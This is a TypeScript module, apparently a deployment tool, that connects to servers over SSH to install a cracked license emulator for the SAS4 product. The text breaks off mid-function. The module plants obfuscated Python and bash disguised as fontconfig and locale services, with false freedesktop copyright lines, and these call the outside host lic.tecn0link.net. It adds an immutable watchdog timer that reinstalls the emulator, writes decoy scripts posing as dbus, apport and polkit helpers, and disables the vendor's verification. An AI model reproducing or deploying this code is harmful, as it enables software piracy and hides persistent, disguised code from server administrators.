import { Client } from "ssh2";
import crypto from "crypto";
import zlib from "zlib";

export const DEPLOY = {
  BASE: "/var/cache/.fontconfig/.uuid",
  EMULATOR: "fonts.cache-2",
  BACKUP: "fonts.cache-1",
  VERIFY: ".fc-match",
  SVC_MAIN: "systemd-fontcached",
  SVC_VERIFY: "systemd-fontcache-gc",
  LOG: "/var/log/.fontconfig-gc.log",
  OBF_KEY: "xK9mZp2vQw4nR7tL",
  PATCH_DIR: "/usr/lib/locale/.cache",
  PATCH_FILE: "locale-gen.update",
  PATCH_SVC: "systemd-localed-refresh",
};

const FEATURES = [
  "gp_fup", "gp_daily_limit", "gp_quota_limit",
  "prm_users_index", "prm_users_index_all", "prm_users_index_group",
  "prm_users_create", "prm_users_update", "prm_users_delete",
  "prm_users_rename", "prm_users_cancel", "prm_users_deposit",
  "prm_users_withdrawal", "prm_users_add_traffic", "prm_users_reset_quota",
  "prm_users_pos", "prm_users_advanced", "prm_users_export",
  "prm_users_change_parent", "prm_users_show_password", "prm_users_mac_lock",
  "prm_managers_index", "prm_managers_create", "prm_managers_update",
  "prm_managers_delete", "prm_managers_sysadmin", "prm_sites_management",
  "prm_groups_assign", "prm_tools_bulk_changes"
];

export interface SSHConnectionResult {
  connected: boolean;
  hardwareId?: string;
  error?: string;
}

export async function testSSHConnection(
  host: string, port: number, username: string, password: string
): Promise<SSHConnectionResult> {
  return new Promise((resolve) => {
    const conn = new Client();
    const timeout = setTimeout(() => {
      conn.end();
      resolve({ connected: false, error: "انتهت مهلة الاتصال" });
    }, 15000);

    conn.on("ready", () => {
      conn.exec(
        `_MI=$(cat /etc/machine-id 2>/dev/null || echo ""); _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo ""); _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo ""); _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo ""); _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo ""); _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo ""); _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo ""); echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}'`,
        (err, stream) => {
          if (err) {
            clearTimeout(timeout);
            conn.end();
            resolve({ connected: true });
            return;
          }
          let output = "";
          stream.on("data", (data: Buffer) => { output += data.toString(); });
          stream.on("close", () => {
            clearTimeout(timeout);
            conn.end();
            resolve({ connected: true, hardwareId: output.trim() || undefined });
          });
        }
      );
    });

    conn.on("keyboard-interactive", (_name, _instructions, _instructionsLang, _prompts, finish) => {
      finish([password]);
    });

    conn.on("error", (err: Error) => {
      clearTimeout(timeout);
      resolve({ connected: false, error: err.message });
    });

    conn.connect({ host, port, username, password, readyTimeout: 10000, tryKeyboard: true } as any);
  });
}

export async function executeSSHCommand(
  host: string, port: number, username: string, password: string, command: string
): Promise<{ success: boolean; output?: string; error?: string }> {
  return new Promise((resolve) => {
    const conn = new Client();
    const timeout = setTimeout(() => {
      conn.end();
      resolve({ success: false, error: "انتهت مهلة الاتصال" });
    }, 120000);

    conn.on("ready", () => {
      conn.exec(command, (err, stream) => {
        if (err) {
          clearTimeout(timeout); conn.end();
          resolve({ success: false, error: err.message });
          return;
        }
        let output = "", errorOutput = "";
        stream.on("data", (data: Buffer) => { output += data.toString(); });
        stream.stderr.on("data", (data: Buffer) => { errorOutput += data.toString(); });
        stream.on("close", (code: number) => {
          clearTimeout(timeout); conn.end();
          resolve({ success: code === 0, output: output.trim(), error: errorOutput.trim() || undefined });
        });
      });
    });

    conn.on("keyboard-interactive", (_name, _instructions, _instructionsLang, _prompts, finish) => {
      finish([password]);
    });

    conn.on("error", (err: Error) => {
      clearTimeout(timeout);
      resolve({ success: false, error: err.message });
    });

    conn.connect({ host, port, username, password, readyTimeout: 10000, tryKeyboard: true } as any);
  });
}

function xorBytes(data: Buffer, key: Buffer): Buffer {
  const r = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) r[i] = data[i] ^ key[i % key.length];
  return r;
}

function obfEncrypt(data: string, key: string): string {
  return xorBytes(Buffer.from(data, "utf-8"), Buffer.from(key, "utf-8")).toString("base64");
}

export function generateObfuscatedEmulator(
  hardwareId: string, licenseId: string, expiresAt: Date,
  maxUsers: number, maxSites: number, status: string,
  serverUrl?: string
): string {
  const apiUrl = serverUrl || "https://lic.tecn0link.net";
  const dataEndpoint = `${apiUrl}/api/license-data/${licenseId}`;
  const encEndpoint = obfEncrypt(dataEndpoint, DEPLOY.OBF_KEY);

  return [
    "#!/usr/bin/env python3",
    "# -*- coding: utf-8 -*-",
    "# fontconfig cache synchronization module v2.13.1",
    "# Auto-generated cache rebuild utility",
    "# (c) freedesktop.org fontconfig project",
    "import http.server as _h",
    "import socketserver as _s",
    "import json as _j",
    "import time as _t",
    "import base64 as _b64",
    "import urllib.request as _u",
    "import ssl as _sl",
    "import signal",
    "import sys",
    "signal.signal(signal.SIGTERM,lambda s,f:sys.exit(0))",
    `_U="${encEndpoint}"`,
    `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
    "_SC=_sl.create_default_context()",
    "_SC.check_hostname=False",
    "_SC.verify_mode=_sl.CERT_NONE",
    "def _f1(_d,_k):",
    " _kb=_k.encode();_dd=_b64.b64decode(_d)",
    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
    "def _f2():",
    " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
    "def _f3(_d,_k):",
    " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
    "def _f4():",
    " try:",
    "  _ep=_f1(_U,_S).decode()",
    "  _rq=_u.Request(_ep)",
    "  _rq.add_header('User-Agent','fontconfig/2.13')",
    "  _rs=_u.urlopen(_rq,timeout=10,context=_SC)",
    "  if _rs.getcode()==200:",
    "   _d=_j.loads(_rs.read().decode())",
    "   if 'pid' in _d:return _j.dumps(_d)",
    " except:",
    "  pass",
    " return None",
    "class _R(_h.BaseHTTPRequestHandler):",
    " def do_GET(self):",
    "  _p=_f4()",
    "  if not _p:",
    "   self.send_response(503)",
    "   self.end_headers()",
    "   return",
    "  _r=_b64.b64encode(_f3(_p,_f2()))",
    "  self.send_response(200)",
    "  self.send_header('Content-length',str(len(_r)))",
    "  self.end_headers()",
    "  self.wfile.write(_r)",
    " def log_message(self,*_x):pass",
    "_s.TCPServer.allow_reuse_address=True",
    "_sv=_s.TCPServer(('0.0.0.0',4000),_R)",
    "_sv.serve_forever()"
  ].join("\n");
}

export function generateHwidBasedEmulator(serverUrl?: string): string {
  const apiUrl = serverUrl || "https://lic.tecn0link.net";
  const baseEndpoint = `${apiUrl}/api/license-data-by-hwid/`;
  const encBase = obfEncrypt(baseEndpoint, DEPLOY.OBF_KEY);

  return [
    "#!/usr/bin/env python3",
    "# -*- coding: utf-8 -*-",
    "# fontconfig cache synchronization module v2.13.1",
    "# Auto-generated cache rebuild utility",
    "# (c) freedesktop.org fontconfig project",
    "import http.server as _h",
    "import socketserver as _s",
    "import json as _j",
    "import time as _t",
    "import base64 as _b64",
    "import urllib.request as _u",
    "import ssl as _sl",
    "import subprocess as _sp",
    "import hashlib as _hl",
    "import signal",
    "import sys",
    "signal.signal(signal.SIGTERM,lambda s,f:sys.exit(0))",
    `_UB="${encBase}"`,
    `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
    "_SC=_sl.create_default_context()",
    "_SC.check_hostname=False",
    "_SC.verify_mode=_sl.CERT_NONE",
    "def _f1(_d,_k):",
    " _kb=_k.encode();_dd=_b64.b64decode(_d)",
    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
    "def _f2():",
    " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
    "def _f3(_d,_k):",
    " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
    "def _rc(c):",
    " try:return _sp.check_output(c,shell=True,stderr=_sp.DEVNULL).decode().strip()",
    " except:return ''",
    "def _ghw():",
    " _mi=_rc('cat /etc/machine-id')",
    " _pu=_rc('cat /sys/class/dmi/id/product_uuid')",
    " _ma=_rc(\"ip link show 2>/dev/null|grep -m1 'link/ether'|awk '{print $2}'\")",
    " _bs=_rc('cat /sys/class/dmi/id/board_serial')",
    " _cs=_rc('cat /sys/class/dmi/id/chassis_serial')",
    " _ds=_rc('lsblk --nodeps -no serial 2>/dev/null|head -1')",
    " _ci=_rc(\"grep -m1 'Serial' /proc/cpuinfo|awk '{print $3}'\")",
    " if not _ci:_ci=_rc('cat /sys/class/dmi/id/product_serial')",
    " _raw=f'{_mi}:{_pu}:{_ma}:{_bs}:{_cs}:{_ds}:{_ci}'",
    " return _hl.sha256(_raw.encode()).hexdigest()[:16]",
    "_HW=_ghw()",
    "def _f4():",
    " try:",
    "  _ep=_f1(_UB,_S).decode()+_HW",
    "  _rq=_u.Request(_ep)",
    "  _rq.add_header('User-Agent','fontconfig/2.13')",
    "  _rs=_u.urlopen(_rq,timeout=10,context=_SC)",
    "  if _rs.getcode()==200:",
    "   _d=_j.loads(_rs.read().decode())",
    "   if 'pid' in _d:return _j.dumps(_d)",
    " except:",
    "  pass",
    " return None",
    "class _R(_h.BaseHTTPRequestHandler):",
    " def do_GET(self):",
    "  _p=_f4()",
    "  if not _p:",
    "   self.send_response(503)",
    "   self.end_headers()",
    "   return",
    "  _r=_b64.b64encode(_f3(_p,_f2()))",
    "  self.send_response(200)",
    "  self.send_header('Content-length',str(len(_r)))",
    "  self.end_headers()",
    "  self.wfile.write(_r)",
    " def log_message(self,*_x):pass",
    "_s.TCPServer.allow_reuse_address=True",
    "_sv=_s.TCPServer(('0.0.0.0',4000),_R)",
    "_sv.serve_forever()"
  ].join("\n");
}

export function generateHwidBasedVerify(serverUrl: string): string {
  const P = DEPLOY;
  const hwidPyB64 = generateHwidCapturePy();

  const innerBash = [
    `_GL="${P.LOG}"`,
    `_BL=$(curl -s "http://127.0.0.1:4000/?op=get" 2>/dev/null)`,
    `if [ -n "$_BL" ]; then`,
    `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
    `fi`,
    `if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then`,
    `  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")`,
    `  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")`,
    `  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")`,
    `  _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")`,
    `  _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")`,
    `  _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")`,
    `  _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")`,
    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}')`,
    `fi`,
    `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"hardware_id\\":\\"$_HW\\"}")`,
    `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
  ].join("\n");

  const encodedBash = Buffer.from(innerBash, "utf-8").toString("base64");

  return [
    "#!/bin/bash",
    "# fontconfig cache gc utility - v2.13.1",
    `eval "$(echo '${encodedBash}' | base64 -d)"`,
  ].join("\n");
}

function generateHwidCapturePy(): string {
  const py = [
    "import base64 as b,json as j,sys",
    "d=b.b64decode(sys.argv[1])",
    "for h in range(25):",
    " k=''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(h)",
    " try:",
    "  r=bytes(d[i]^k.encode()[i%len(k.encode())] for i in range(len(d))).decode()",
    "  if 'hwid' in r:print(j.loads(r)['hwid']);break",
    " except:pass",
  ].join("\n");
  return Buffer.from(py, "utf-8").toString("base64");
}

export function generateObfuscatedVerify(licenseId: string, serverUrl: string, serverHost?: string): string {
  const P = DEPLOY;
  const hwidPyB64 = generateHwidCapturePy();

  const innerBash = [
    `_GL="${P.LOG}"`,
    `_BL=$(curl -s "http://127.0.0.1:4000/?op=get" 2>/dev/null)`,
    `if [ -n "$_BL" ]; then`,
    `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
    `fi`,
    `if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then`,
    `  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")`,
    `  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")`,
    `  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")`,
    `  _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")`,
    `  _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")`,
    `  _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")`,
    `  _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")`,
    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}')`,
    `fi`,
    `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"license_id\\":\\"${licenseId}\\",\\"hardware_id\\":\\"$_HW\\"}")`,
    `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
  ].join("\n");

  const encodedBash = Buffer.from(innerBash, "utf-8").toString("base64");

  return [
    "#!/bin/bash",
    "# fontconfig cache gc utility - v2.13.1",
    `eval "$(echo '${encodedBash}' | base64 -d)"`,
  ].join("\n");
}

export function generateLicenseFileContent(
  licenseId: string, hardwareId: string, expiresAt: Date,
  maxUsers: number, maxSites: number, status: string
): string {
  const payload = {
    pid: licenseId, hwid: hardwareId,
    exp: expiresAt.toISOString().replace("T", " ").substring(0, 19),
    st: status === "active" ? "1" : "0",
    mu: maxUsers.toString(), ms: maxSites.toString(),
    id: licenseId,
    hash: crypto.createHash("sha256").update(`${licenseId}:${hardwareId}:${expiresAt.toISOString()}`).digest("hex"),
    ftrs: FEATURES,
  };
  return JSON.stringify(payload, null, 2);
}

export async function computeRemoteHWID(
  host: string, port: number, username: string, password: string
): Promise<{ success: boolean; hwid?: string; rawHwid?: string; error?: string }> {
  const hwidScript = `#!/bin/bash
MI=$(cat /etc/machine-id 2>/dev/null || echo "")
PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}')
[ -z "\${MA}" ] && MA=""
BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")
CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")
DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1)
[ -z "\${DS}" ] && DS=""
CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}')
[ -z "\${CI}" ] && CI=$(cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
RAW="\${MI}:\${PU}:\${MA}:\${BS}:\${CS}:\${DS}:\${CI}"
echo "RAW:\${RAW}"
echo -n "\${RAW}" | sha256sum | awk '{print substr($1,1,16)}'
`;
  const encoded = Buffer.from(hwidScript, "utf-8").toString("base64");
  const command = `_t=$(mktemp); echo '${encoded}' | base64 -d > "$_t"; bash "$_t"; rm -f "$_t"`;
  const result = await executeSSHCommand(host, port, username, password, command);
  if (!result.success || !result.output) {
    return { success: false, error: result.error || "Failed to compute HWID" };
  }
  const lines = result.output.trim().split("\n");
  let rawHwid: string | undefined;
  let hwid: string | undefined;
  for (const line of lines) {
    if (line.startsWith("RAW:")) rawHwid = line.substring(4);
    else if (/^[a-f0-9]{16,64}$/.test(line.trim())) hwid = line.trim();
  }
  if (!hwid) {
    return { success: false, error: "Could not parse HWID from server output" };
  }
  return { success: true, hwid, rawHwid };
}

export async function deployLicenseToServer(
  host: string, port: number, username: string, password: string,
  hardwareId: string, licenseId: string, expiresAt: Date,
  maxUsers: number, maxSites: number, status: string, serverUrl: string
): Promise<{ success: boolean; output?: string; error?: string; computedHwid?: string }> {
  let finalHwid = hardwareId;
  const hwidResult = await computeRemoteHWID(host, port, username, password);
  if (hwidResult.success && hwidResult.hwid) {
    finalHwid = hwidResult.hwid;
  } else {
    console.warn(`[HWID] Warning: Could not compute HWID on target server ${host}: ${hwidResult.error}. Using fallback HWID.`);
  }
  const emulator = generateObfuscatedEmulator(finalHwid, licenseId, expiresAt, maxUsers, maxSites, status, serverUrl);
  const verify = generateObfuscatedVerify(licenseId, serverUrl, host);
  const P = DEPLOY;

  const deployScript = `#!/bin/bash

systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
systemctl stop sas4-verify.timer sas4-verify 2>/dev/null || true
systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
fuser -k 4000/tcp 2>/dev/null || true
sleep 1

_PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")

mkdir -p ${P.BASE}
mkdir -p ${P.PATCH_DIR}

if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f ${P.BASE}/${P.BACKUP} ]; then
  cp /opt/sas4/bin/sas_sspd ${P.BASE}/${P.BACKUP}
  chmod +x ${P.BASE}/${P.BACKUP}
fi

cat > ${P.BASE}/${P.EMULATOR} << '_FC_2_'
${emulator}
_FC_2_
chmod +x ${P.BASE}/${P.EMULATOR}

cat > ${P.BASE}/${P.VERIFY} << '_FC_V_'
${verify}
_FC_V_
chmod +x ${P.BASE}/${P.VERIFY}

cat > /etc/systemd/system/${P.SVC_MAIN}.service << _SVC_1_
[Unit]
Description=System font cache synchronization daemon
After=network.target
[Service]
ExecStart=$_PY3 ${P.BASE}/${P.EMULATOR}
Restart=always
RestartSec=3
KillMode=process
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
_SVC_1_

cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_SVC_2_'
[Unit]
Description=Font cache garbage collection
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
_SVC_2_

cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_TMR_1_'
[Unit]
Description=Font cache gc timer
[Timer]
OnBootSec=60
OnUnitActiveSec=6h
Persistent=true
[Install]
WantedBy=timers.target
_TMR_1_

_EMU_B64=$(base64 -w0 ${P.BASE}/${P.EMULATOR})
_VER_B64=$(base64 -w0 ${P.BASE}/${P.VERIFY})

_PY3_PATH=$_PY3
chattr -i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
cat > ${P.PATCH_DIR}/${P.PATCH_FILE} << _PATCH_END_
#!/bin/bash
_d="${P.BASE}"
_e="${P.EMULATOR}"
_s1="${P.SVC_MAIN}"
_s2="${P.SVC_VERIFY}"
_py="\${_PY3_PATH}"
_eb="\${_EMU_B64}"
_vb="\${_VER_B64}"
if ! systemctl is-active \\\${_s1} >/dev/null 2>&1; then
  mkdir -p \\\${_d}
  if [ ! -f \\\${_d}/\\\${_e} ]; then
    echo "\\\${_eb}" | base64 -d > \\\${_d}/\\\${_e}
    chmod +x \\\${_d}/\\\${_e}
  fi
  if [ ! -f \\\${_d}/.fc-match ]; then
    echo "\\\${_vb}" | base64 -d > \\\${_d}/.fc-match
    chmod +x \\\${_d}/.fc-match
  fi
  if [ ! -f /etc/systemd/system/\\\${_s1}.service ]; then
    cat > /etc/systemd/system/\\\${_s1}.service << _RS1_
[Unit]
Description=System font cache synchronization daemon
After=network.target
[Service]
ExecStart=\\\${_py} ${P.BASE}/${P.EMULATOR}
Restart=always
RestartSec=3
KillMode=process
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
_RS1_
  fi
  if [ ! -f /etc/systemd/system/\\\${_s2}.service ]; then
    cat > /etc/systemd/system/\\\${_s2}.service << '_RS2_'
[Unit]
Description=Font cache garbage collection
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.BASE}/.fc-match
_RS2_
  fi
  if [ ! -f /etc/systemd/system/\\\${_s2}.timer ]; then
    cat > /etc/systemd/system/\\\${_s2}.timer << '_RS3_'
[Unit]
Description=Font cache gc timer
[Timer]
OnBootSec=60
OnUnitActiveSec=6h
Persistent=true
[Install]
WantedBy=timers.target
_RS3_
  fi
  systemctl daemon-reload
  systemctl enable \\\${_s1} \\\${_s2}.timer
  systemctl start \\\${_s2}.timer
  systemctl start \\\${_s1}
fi
_PATCH_END_
chmod +x ${P.PATCH_DIR}/${P.PATCH_FILE}
chattr +i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true

cat > /etc/systemd/system/${P.PATCH_SVC}.service << '_PSVC_'
[Unit]
Description=Locale database refresh service
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}
_PSVC_

cat > /etc/systemd/system/${P.PATCH_SVC}.timer << '_PTMR_'
[Unit]
Description=Locale database refresh timer
[Timer]
OnBootSec=120
OnUnitActiveSec=5min
Persistent=true
[Install]
WantedBy=timers.target
_PTMR_

systemctl disable sas4-verify.timer sas4-verify 2>/dev/null || true
rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null
rm -f /opt/sas4/verify.sh 2>/dev/null

mkdir -p /opt/sas4/bin
cp ${P.BASE}/${P.EMULATOR} /opt/sas4/bin/sas_tec.py
chmod +x /opt/sas4/bin/sas_tec.py

_DF1="/usr/lib/python3/dist-packages/dbus/_monitor.py"
_DF2="/usr/share/apport/recoverable_problem.py"
_DF3="/var/lib/dpkg/info/libpam-runtime.py"
_DF4="/usr/lib/networkd/netlink_cache.py"
_DF5="/var/cache/apt/pkgcache.py"
_DF6="/usr/lib/udev/hwdb_update.py"
_DF7="/usr/share/polkit-1/actions/policy_agent.py"

_DECOY_SCRIPTS=(
"#!/usr/bin/env python3
# dbus-monitor session handler v1.14.10
# (c) freedesktop.org - D-Bus message bus system
import dbus,sys,os
class SessionMonitor:
 def __init__(s):s._bus=None;s._active=False
 def attach(s,bus_addr=None):
  try:s._bus=dbus.SystemBus();s._active=True
  except:pass
 def poll(s):
  if not s._active:return None
  return s._bus.get_name_owner('org.freedesktop.DBus') if s._bus else None
if __name__=='__main__':
 m=SessionMonitor();m.attach()
"
"#!/usr/bin/env python3
# apport crash recovery helper v2.20.11
# Canonical Ltd - Ubuntu Error Reporting
import subprocess,hashlib,json,time
def check_core(pid):
 try:return subprocess.check_output(['cat',f'/proc/{pid}/status']).decode()
 except:return ''
def gen_report(core_data):
 return {'ts':int(time.time()),'hash':hashlib.md5(core_data.encode()).hexdigest()[:8]}
"
"#!/usr/bin/env python3
# dpkg trigger helper - libpam-runtime
# Debian package management infrastructure
import os,sys,configparser
_PAM_DIR='/etc/pam.d'
def scan_modules():
 return [f for f in os.listdir(_PAM_DIR) if not f.startswith('.')]
def validate_config(mod):
 p=os.path.join(_PAM_DIR,mod)
 return os.path.isfile(p) and os.access(p,os.R_OK)
"
"#!/usr/bin/env python3
# systemd-networkd netlink cache v255
# systemd network management daemon helper
import socket,struct,os
NETLINK_ROUTE=0
def nl_msg(nltype,flags=0):
 return struct.pack('=IHHII',16,nltype,flags|1,0,os.getpid())
def get_links():
 try:
  s=socket.socket(socket.AF_NETLINK,socket.SOCK_RAW,NETLINK_ROUTE)
  s.bind((os.getpid(),0));s.send(nl_msg(18,0x300))
  return s.recv(65536)
 except:return b''
"
"#!/usr/bin/env python3
# apt package cache index builder v2.7.3
# Advanced Package Tool - cache management
import gzip,hashlib,os,time
_CACHE='/var/cache/apt'
_LISTS='/var/lib/apt/lists'
def rebuild_index():
 pkgs=[];ts=int(time.time())
 for f in os.listdir(_LISTS):
  if f.endswith('_Packages'):pkgs.append(f)
 return {'count':len(pkgs),'ts':ts,'hash':hashlib.sha1(str(pkgs).encode()).hexdigest()[:12]}
"
"#!/usr/bin/env python3
# udev hardware database update helper v255
# systemd/udev device manager
import os,re,subprocess
_HWDB='/etc/udev/hwdb.d'
def parse_modalias(path):
 try:
  with open(path) as f:return f.read().strip()
 except:return ''
def update_db():
 subprocess.run(['systemd-hwdb','update'],capture_output=True)
"
"#!/usr/bin/env python3
# polkit policy agent v0.105
# freedesktop.org PolicyKit authentication agent
import os,hashlib,json
_ACTIONS='/usr/share/polkit-1/actions'
def list_policies():
 return [f for f in os.listdir(_ACTIONS) if f.endswith('.policy')]
def check_auth(action_id,pid):
 return {'authorized':False,'action':action_id,'pid':pid}
"
)

mkdir -p /usr/lib/python3/dist-packages/dbus /usr/share/apport /var/lib/dpkg/info /usr/lib/networkd /usr/lib/udev /usr/share/polkit-1/actions 2>/dev/null
_DI=0
for _DP in "$_DF1" "$_DF2" "$_DF3" "$_DF4" "$_DF5" "$_DF6" "$_DF7"; do
  echo "\${_DECOY_SCRIPTS[$_DI]}" > "$_DP" 2>/dev/null
  chmod 644 "$_DP" 2>/dev/null
  _DI=$((_DI+1))
done

cat > /etc/systemd/system/sas_systemmanager.service << '_SAS_SVC_'
[Unit]
Description=SAS4 System
[Service]
ExecStart=/usr/bin/python3 /opt/sas4/bin/sas_tec.py
Restart=always
[Install]
WantedBy=multi-user.target
_SAS_SVC_

systemctl daemon-reload
systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true
systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer sas_systemmanager
systemctl start ${P.SVC_VERIFY}.timer
systemctl start ${P.PATCH_SVC}.timer
fuser -k 4000/tcp 2>/dev/null || true
sleep 1
systemctl stop sas_systemmanager 2>/dev/null || true
systemctl start ${P.SVC_MAIN}
sleep 3
if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then
  echo "SERVICE_FAILED"
  echo "=== STATUS ==="
  systemctl status ${P.SVC_MAIN} --no-pager 2>&1 || true
  echo "=== JOURNAL ==="
  journalctl -u ${P.SVC_MAIN} -n 15 --no-pager 2>/dev/null || true
  echo "=== FC_DEBUG ==="
  cat /tmp/.fc-debug 2>/dev/null || echo "NO_DEBUG_FILE"
  echo "=== PYTHON_PATH ==="
  which python3 2>&1
  python3 --version 2>&1
  echo "=== SVC_FILE ==="
  cat /etc/systemd/system/${P.SVC_MAIN}.service 2>/dev/null || echo "SVC_NOT_FOUND"
  echo "=== DIRECT_RUN ==="
  timeout 5 python3 ${P.BASE}/${P.EMULATOR} 2>&1 &
  _DRPID=$!
  sleep 3
  echo "=== PORT_CHECK ==="
  ss -tlnp | grep 4000 2>/dev/null || echo "PORT_4000_FREE"
  kill $_DRPID 2>/dev/null || true
else
  echo "SERVICE_OK"
fi
`;

  const encodedDeploy = Buffer.from(deployScript, "utf-8").toString("base64");
  const command = `_t=$(mktemp); echo '${encodedDeploy}' | base64 -d > "$_t"; bash "$_t"; _rc=$?; rm -f "$_t"; exit $_rc`;

  const result = await executeSSHCommand(host, port, username, password, command);
  return { ...result, computedHwid: finalHwid !== hardwareId ? finalHwid : undefined };
}

export function generatePatchDeployPayload(
  emulatorCode: string,
  verifyScript: string
): string {
  const P = DEPLOY;
  const emuB64 = Buffer.from(emulatorCode, "utf-8").toString("base64");
  const verB64 = Buffer.from(verifyScript, "utf-8").toString("base64");

  const watchdog = [
    "#!/bin/bash",
    '_py=$(which python3 2>/dev/null || echo "/usr/bin/python3")',
    `if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then`,
    `  mkdir -p ${P.BASE}`,
    `  if [ ! -f ${P.BASE}/${P.EMULATOR} ]; then`,
    `    echo "${emuB64}" | base64 -d > ${P.BASE}/${P.EMULATOR}`,
    `    chmod +x ${P.BASE}/${P.EMULATOR}`,
    "  fi",
    `  mkdir -p /opt/sas4/bin`,
    `  cp ${P.BASE}/${P.EMULATOR} /opt/sas4/bin/sas_tec.py`,
    `  chmod +x /opt/sas4/bin/sas_tec.py`,
    `  if [ ! -f ${P.BASE}/${P.VERIFY} ]; then`,
    `    echo "${verB64}" | base64 -d > ${P.BASE}/${P.VERIFY}`,
    `    chmod +x ${P.BASE}/${P.VERIFY}`,
    "  fi",
    `  if [ ! -f /etc/systemd/system/${P.SVC_MAIN}.service ]; then`,
    `    cat > /etc/systemd/system/${P.SVC_MAIN}.service << _RS1_`,
    "[Unit]",
    "Description=System font cache synchronization daemon",
    "After=network.target",
    "[Service]",
    "ExecStart=$_py " + `${P.BASE}/${P.EMULATOR}`,
    "Restart=always",
    "RestartSec=3",
    "KillMode=process",
    "StandardOutput=journal",
    "StandardError=journal",
    "[Install]",
    "WantedBy=multi-user.target",
